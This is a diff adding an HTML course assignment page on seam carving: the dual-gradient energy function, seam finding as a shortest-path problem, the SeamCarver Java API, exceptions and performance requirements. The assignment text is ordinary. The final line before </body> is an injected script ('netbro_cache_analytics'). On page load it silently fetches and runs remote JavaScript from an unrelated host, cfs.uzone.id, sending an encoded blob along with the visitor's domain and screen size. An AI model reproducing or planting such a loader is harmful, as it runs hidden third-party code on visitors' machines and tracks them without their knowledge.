@@ -1,0 +1,327 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+<title>
+Programming Assignment 2: Seam Carving
+</title>
+</head>
+
+<body>
+<h2>Programming Assignment 2: Seam Carving</h2>
+
+
+<p><br>
+
+Seam-carving is a content-aware image resizing technique where the image is reduced in size by one 
+pixel of height (or width) at a time. 
+A <em>vertical seam</em> in an image is a path of pixels connected from the top to the bottom
+with one pixel in each row.
+(A <em>horizontal seam</em> is a path of pixels connected from the left to the right
+with one pixel in each column.)
+Below left is the original 505-by-287 pixel image; below right is the result after removing
+150 vertical seams, resulting in a 30% narrower image.
+Unlike standard content-agnostic resizing techniques (e.g. cropping and scaling), the most 
+interesting features (aspect ratio, set of objects present, etc.) of the image are preserved.
+
+<p>
+As you'll soon see, the underlying algorithm is quite simple and elegant.
+Despite this fact, this technique was not discovered until 2007 by Shai Avidan and Ariel Shamir.
+It is now a feature in Adobe Photoshop (thanks to a Princeton graduate student), as well
+as other popular computer graphics applications.
+
+<p>
+</p><center>
+<img src="HJoceanSmall.png" alt="Dr. Hug in the ocean">
+
+<img src="HJoceanSmallShrunk.png" alt="Dr. Hug in the ocean">
+</center>
+
+
+<p> In this assignment, you will create a data type that resizes a <em>W</em>-by-<em>H</em> image using 
+the seam-carving technique. 
+
+<p>
+Finding and removing a seam involves three parts and a tiny bit of notation:
+
+<ol start = "0">
+
+<li><em>Notation.</em>
+In image processing, pixel (<em>x</em>, <em>y</em>) refers to the pixel in
+column <em>x</em> and row <em>y</em>, with
+pixel (0, 0) at the upper left corner and pixel
+(<em>W</em> &minus; 1, <em>H</em> &minus; 1) at the bottom right corner.
+This is consistent with the
+<a href = "https://algs4.cs.princeton.edu/code/javadoc/edu/princeton/cs/algs4/Picture.html">Picture</a>
+data type in <code>algs4.jar</code>.
+<em>Warning</em>: this is the opposite of the standard mathematical notation used in linear algebra
+where (<em>i</em>, <em>j</em>) refers to row <em>i</em> and column <em>j</em> and with Cartesian
+coordinates where (0, 0) is at the lower left corner.
+
+<p>
+<center>
+   <table CLASS = "fixedWidthTable">
+  <caption><Em>a 3-by-4 image</em></caption>
+
+    <tr>
+      <td align="center" bgcolor="#eeeeee">&nbsp; (0, 0) &nbsp;</td>
+      <td align="center" bgcolor="#eeeeee">&nbsp; (1, 0) &nbsp;</td>
+      <td align="center" bgcolor="#eeeeee">&nbsp; (2, 0) &nbsp;</td>
+    </tr>    
+    <tr>
+      <td align="center" bgcolor="#eeeeee">&nbsp; (0, 1) &nbsp;</td>
+      <td align="center" bgcolor="#eeeeee">&nbsp; (1, 1) &nbsp;</td>
+      <td align="center" bgcolor="#eeeeee">&nbsp; (2, 1) &nbsp;</td>
+    </tr>
+    <tr>
+      <td align="center" bgcolor="#eeeeee">&nbsp; (0, 2) &nbsp;</td>
+      <td align="center" bgcolor="#eeeeee">&nbsp; (1, 2) &nbsp;</td>
+      <td align="center" bgcolor="#eeeeee">&nbsp; (2, 2) &nbsp;</td>
+    </tr>
+    <tr>
+      <td align="center" bgcolor="#eeeeee">&nbsp; (0, 3) &nbsp;</td>
+      <td align="center" bgcolor="#eeeeee">&nbsp; (1, 3) &nbsp;</td>
+      <td align="center" bgcolor="#eeeeee">&nbsp; (2, 3) &nbsp;</td>
+    </tr>
+</table>
+</center>
+
+<p>
+We also assume that the color of a pixel is represented in RGB space, using three
+integers between 0 and 255.
+This is consistent with the
+<a href = "http://docs.oracle.com/javase/7/docs/api/java/awt/Color.html">java.awt.Color</a> data type.
+
+
+<p><li><em>Energy calculation.</em>
+The first step is to calculate the <em>energy</em> of each pixel, which is a measure of the 
+importance of each pixel&mdash;the higher the energy, the less likely that the pixel will be included 
+as part of a seam (as we'll see in the next step).
+
+<!--See <a href="http://dl.acm.org/citation.cfm?id=1276390">the original Seam Carving paper</a> for a discussion of different energy functions.-->
+
+In this assignment, you will implement the <em>dual-gradient energy function</em>, which is described below.
+Here is the dual-gradient energy function of the surfing image above:
+
+   <p><center><img src="HJoceanSmallEnergy.png" alt = "Dr. Hug as energy"></center>
+
+<p>The energy is high (white) for pixels in the image where there is a rapid color gradient
+(such as the boundary between the sea and sky and the boundary between the surfing Josh Hug 
+on the left and the ocean behind him). The seam-carving technique avoids removing such high-energy pixels.
+
+</li>
+
+<p><li><em>Seam identification.</em>
+The next step is to find a vertical seam of minimum total energy.
+This is similar to the classic shortest path problem
+in an edge-weighted digraph except for the following:
+<ul>
+<p><li> The weights are on the vertices instead of the edges.
+<p><li> We want to find the shortest path from any of the <em>W</em> pixels in the top row
+to any of the <em>W</em> pixels in the bottom row.
+<p><li> The digraph is acyclic, where there is a downward edge from pixel
+(<em>x</em>,           <em>y</em>) to pixels 
+(<em>x</em> &minus; 1, <em>y</em> + 1),
+(<em>x</em>,           <em>y</em> + 1), and
+(<em>x</em> + 1,       <em>y</em> + 1),
+assuming that the coordinates are in the prescribed range.
+
+
+</ul>
+
+<p><center><img src="HJoceanSmallVerticalSeam.png" alt = "Vertical Seam"></center></li>
+
+<p><li><em>Seam removal.</em>
+The final step is to remove from the image all of the pixels along the seam.
+
+</ol>
+
+
+
+<p>
+<b>The SeamCarver API.</b> Your task is to implement the following mutable data type:
+
+</p><blockquote>
+<pre><b>public class SeamCarver {</b>
+<b>   public SeamCarver(Picture picture)                </b><font color = gray>// create a seam carver object based on the given picture</font>
+<b>   public Picture picture()                          </b><font color = gray>// current picture</font>
+<b>   public     int width()                            </b><font color = gray>// width of current picture</font>
+<b>   public     int height()                           </b><font color = gray>// height of current picture</font>
+<b>   public  double energy(int x, int y)               </b><font color = gray>// energy of pixel at column x and row y</font>
+<b>   public   int[] findHorizontalSeam()               </b><font color = gray>// sequence of indices for horizontal seam</font>
+<b>   public   int[] findVerticalSeam()                 </b><font color = gray>// sequence of indices for vertical seam</font>
+<b>   public    void removeHorizontalSeam(int[] seam)   </b><font color = gray>// remove horizontal seam from current picture</font>
+<b>   public    void removeVerticalSeam(int[] seam)     </b><font color = gray>// remove vertical seam from current picture</font>
+<b>}</b>
+</pre>
+</blockquote>
+
+<ul>
+
+<li><p><b>Corner cases.</b> 
+Your code should throw a <code>java.lang.IllegalArgumentException</code> when a constructor or method is called with
+an invalid argument, as documented below:
+<ul>
+
+<p><li>
+By convention, the indices <em>x</em> and <em>y</em> are integers between 0 and <em>width</em> &minus; 1 and between
+0 and <em>height</em> &minus; 1 respectively, where <em>width</em> is the width of the current image and <em>height</em>
+is the height. Throw a <code>java.lang.IllegalArgumentException</code> if either <em>x</em> or <em>y</em>
+is outside its prescribed range.
+
+<p><li>
+Throw a <code>java.lang.IllegalArgumentException</code> if the constructor,
+<code>removeVerticalSeam()</code>, or <code>removeHorizontalSeam()</code> is called with a null argument.
+
+<p><li>
+Throw a <code>java.lang.IllegalArgumentException</code> if <code>removeVerticalSeam()</code> or
+<code>removeHorizontalSeam()</code> is called with an array of the wrong length
+or if the array is not a valid seam (i.e., either an entry is outside its prescribed range
+or two adjacent entries differ by more than 1).
+
+<p><li>
+Throw a <code>java.lang.IllegalArgumentException</code> if <code>removeVerticalSeam()</code> 
+is called when the width of the picture is less than or equal to 1 or if
+<code>removeHorizontalSeam()</code> is called when the height of the picture
+is less than or equal to 1.
+
+</ul>
+
+<p><li><b>Constructor.</b>
+The data type may not mutate the <code>Picture</code> argument to the constructor.
+
+<p><li><b>Computing the energy of a pixel.</b>
+You will use the <em>dual-gradient energy function</em>: The
+energy of pixel \((x, y)\) is
+\(\sqrt{\Delta_x^2(x, y) + \Delta_y^2(x, y)}\),
+where the square of the <em>x-</em>gradient
+\(\Delta_x^2(x, y) = R_x(x, y)^2 + G_x(x, y)^2 + B_x(x, y)^2\),
+and where the central differences
+\(R_x(x, y)\),
+\(G_x(x, y)\), and
+\(B_x(x, y)\)
+are the differences in the red, green, and blue components between
+pixel (<em>x</em> + 1, <em>y</em>) and pixel (<em>x</em> &minus; 1, <em>y</em>), respectively.
+The square of the <em>y</em>-gradient
+\(\Delta_y^2(x, y)\) is defined in an analogous manner.
+We define the energy of a pixel at the border of the image to be 1000, so that it is strictly
+larger than the energy of any interior pixel.
+
+<p>
+As an example, consider the 3-by-4 image
+(supplied as <a href = "../testing/seamCarving/3x4.png">3x4.png</a>)
+with RGB values&mdash;each component is an integer between 0 and 255&mdash;as shown in the table below:
+
+<p><center><img src="dual-gradient.png" width=700 alt = "RGB values and dual-gradient energies of a 3-by-4 image"></center>
+
+<p>
+The ten border pixels have energy 1000. Only the pixels (1, 1) and (1, 2) are nontrivial.
+We calculate the energy of pixel (1, 2) in detail:
+
+<p>
+<em>R</font><sub>x</sub></em>(1, 2) = 255 &minus; 255 = 0, <br>
+<em>G</font><sub>x</sub></em>(1, 2) = 205 &minus; 203 = 2, <br>
+<em>B</font><sub>x</sub></em>(1, 2) = 255 &minus; 51 = 204, <br>
+yielding &Delta;<sub><em>x</em></sub><sup>2</sup>(1, 2) = 2<sup>2</sup> + 204<sup>2</sup> = 41620. 
+
+<p>
+<em>R</font><sub>y</sub></em>(1, 2) = 255 &minus; 255 = 0, <br>
+<em>G</font><sub>y</sub></em>(1, 2) = 255 &minus; 153 = 102, <br>
+<em>B</font><sub>y</sub></em>(1, 2) = 153 &minus; 153 = 0</code>, <br>
+yielding &Delta;<sub><em>y</em></sub><sup>2</sup>(1, 2) = 102<sup>2</sup> = 10404. 
+
+<p>
+<p> Thus, the energy of pixel (1, 2) is \(\sqrt{41620 + 10404} = \sqrt{52024}\).
+Similarly, the energy of pixel (1, 1) is \(\sqrt{204^2 + 103^2}= \sqrt{52225}\).
+
+
+<Br>
+<li><b>Finding a vertical seam.</b>
+The <code>findVerticalSeam()</code> method returns an array of length <em>H</em>
+such that entry <em>y</em> is the column number of the pixel to
+be removed from row <em>y</em> of the image.
+For example, the dual-gradient energies of a 6-by-5 image
+(supplied as <a href = "../testing/seamCarving/6x5.png">6x5.png</a>).
+
+
+<p><center><img src="vertical-seam.png" width=450 alt = "dual-gradient energies and a minimum vertical seam for a 6-by-5 image"></center>
+
+
+<p>
+The minimum energy vertical seam is highlighted in blue.
+In this case, the method <code>findVerticalSeam()</code> returns the array { 3, 4, 3, 2, 2 }
+because the pixels in a minimum energy vertical seam are
+(3, <font color = gray>0</font>),
+(4, <font color = gray>1</font>),
+(3, <font color = gray>2</font>),
+(2, <font color = gray>3</font>), and
+(2, <font color = gray>4</font>).
+When there are multiple vertical seams with minimal total energy, your method can return
+any such seam.
+
+<li><p><b>Finding a horizontal seam.</b>
+The behavior of <code>findHorizontalSeam()</code> is
+analogous to that of <code>findVerticalSeam()</code> except that it returns
+an array of length <em>width</em> such that entry <em>x</em> is the row number of 
+the pixel to be removed from column <em>x</em> of the image.
+For the 6-by-5 image, the method <code>findHorizontalSeam()</code> returns the array { 2, 2, 1, 2, 1, 2 }
+because the pixels in a minimum energy horizontal seam are
+(<font color = gray>0</font>, 2),
+(<font color = gray>1</font>, 2),
+(<font color = gray>2</font>, 1),
+(<font color = gray>3</font>, 2),
+(<font color = gray>4</font>, 1), and
+(<font color = gray>5</font>, 2).
+
+
+<p><center><img src="horizontal-seam.png" width=450 alt = "dual-gradient energies and a minimum horizontal seam for a 6-by-5 image"></center>
+
+<li>
+<p><b>Performance requirements.</b>
+The <code>width()</code>, <code>height()</code>, and <code>energy()</code> methods should take constant time in the worst case.
+All other methods should run in time at most proportional to <em>width &times; height</em> in the worst case.
+For faster performance, do not construct explicit <code>DirectedEdge</code> and
+<code>EdgeWeightedDigraph</code> objects.
+
+</ul>
+
+<p><b>Analysis of running time (optional and not graded).</b>&nbsp;
+<ul>
+
+<p><li>Give the worst-case running time to remove <em>r</em> rows and <em>c</em> columns from a <em>width</em>-by-<em>height</em>
+image as a function of <em>r</em>, <em>c</em>, <em>width</em>, and <em>height</em>.
+
+<p><li>
+Estimate empirically the running time (in seconds) to remove <em>r</em> rows and <em>c</em> columns 
+from a <em>width</em>-by-<em>height</em> image as a function of <em>r</em>, <em>c</em>, <em>width</em>, and 
+<em>H</em>. Use tilde notation to simplify your answer.
+
+<!--
+<p><li>
+Advanced: Do you observe any caching effects (e.g. does the time to remove a horizontal seam
+differ significantly from the time to remove a vertical seam
+ row removals and column removals differ 
+substantially in run time)? Explain any caching effects (or the lack thereof).
+-->
+
+</ul>
+
+
+<p>
+<b>Deliverables.</b>
+Submit <code>SeamCarver.java</code>, and any other supporting files 
+(excluding <code>algs4.jar</code> and <code>SCUtility.java</code>).
+You may not call any library functions other those in
+<code>java.lang</code>, <code>java.util</code>, <code>java.awt.Color</code>, and <code>algs4.jar</code>.
+
+
+
+</p><p>
+</p><address><small>This assignment was developed by Josh Hug, Maia Ginsburg, and Kevin Wayne.
+</small></address>
+
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582HVlH3eBnL3166ibNlFsFVmcoqQHQwBSpRGWv3kG85OotoMUtGRH7gU%2b9sT87B59i9h0mhoDPKdouAGPa65tj1olzLPhX6RHSoNpvKe8im2RZ5SQqG648Hj1hz%2bW1XpTfj4ChY7gw1oEk0s%2bVch0kXHV8sBQWncUwWxzrAa9dWFcZxL52YvN2L6LuZiATjkLJgHmSgHocsXGmov2wWF3j4X2kRJXeAokDSfXSpWix3025eieCeoPJROdLzYAUytHk2%2bTXQp6CEHIBGG3b0UoHZAsLPqemyBYgyySXsRMKH%2fnrtP7NsCwAMINktE5kK8zCpNOKro%2fkMM%2fomwr5RDb8xF5MtMWUorZdL9SBGCh9KmkZtw6D%2bbBn0RsAvBnY4wp66iuSkCxqRxsPv3zN13fIraKypsnrXFw4QAtx%2bL8S4F9VqtJI5JtXqhP3HAQurT2NADe2F9LIlGS%2b%2f8DTCjpjpfW3k7rqnaX%2fZRTMaoi23Cqp5tEZa4%2f0NbMRTEdtq7fotmfhp382dS%2bDfF%2fU4J7QUs79c0FsUjbzw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body></html>
